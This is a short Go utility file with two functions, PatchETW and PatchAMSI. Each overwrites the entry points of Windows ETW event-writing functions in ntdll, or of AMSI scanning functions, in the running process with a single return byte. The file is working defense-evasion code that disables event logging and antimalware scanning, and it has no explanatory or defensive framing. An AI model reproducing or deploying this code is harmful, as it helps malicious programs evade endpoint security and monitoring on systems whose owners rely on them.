package utils

import (
	"log"
	"syscall"

	"golang.org/x/sys/windows"
)

var patch []byte = []byte{0xC3} // dumb patch

func PatchETW() {

	ntdll := syscall.NewLazyDLL("ntdll")

	a := []uintptr{
		ntdll.NewProc("EtwEventWrite").Addr(),
		ntdll.NewProc("EtwEventWriteEx").Addr(),
		ntdll.NewProc("EtwEventWriteFull").Addr(),
		ntdll.NewProc("EtwEventWriteString").Addr(),
		ntdll.NewProc("EtwEventWriteTransfer").Addr(),
	}

	for _, addr := range a {
		var written uintptr
		if err := windows.WriteProcessMemory(windows.CurrentProcess(), uintptr(addr), &patch[0], uintptr(len(patch)), &written); err != nil {
			log.Printf("[ERROR] error in WriteProcessMemory: %s\n", err)
		}
	}

	log.Printf("Done\n")
}

func PatchAMSI() {

	amsi := syscall.NewLazyDLL("amsi")

	a := []uintptr{
		amsi.NewProc("AmsiScanBuffer").Addr(),
		amsi.NewProc("AmsiScanString").Addr(),
		amsi.NewProc("AmsiInitialize").Addr(),
	}

	for _, addr := range a {
		var written uintptr
		if err := windows.WriteProcessMemory(windows.CurrentProcess(), uintptr(addr), &patch[0], uintptr(len(patch)), &written); err != nil {
			log.Printf("[ERROR] error in WriteProcessMemory: %s\n", err)
		}
	}

	log.Printf("Done\n")
}
